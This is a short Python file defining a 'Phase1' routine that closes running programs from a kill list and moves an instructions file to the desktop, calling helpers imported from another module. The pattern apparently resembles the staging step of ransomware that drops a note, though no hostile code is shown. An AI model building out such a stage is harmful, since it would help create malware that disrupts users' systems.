# Libraries
from main import *

# Variables
Get_Software = True
Kill_Software_List = []

# Debug
def Phase1():
    
    Get_Running_Processes(Kill_Software_List)
    Close_Programs(Kill_Software_List)
    
    Move_File(INSTRUCTIONS_PATH, DESKTOP)
        
    Cool_Down(0.5)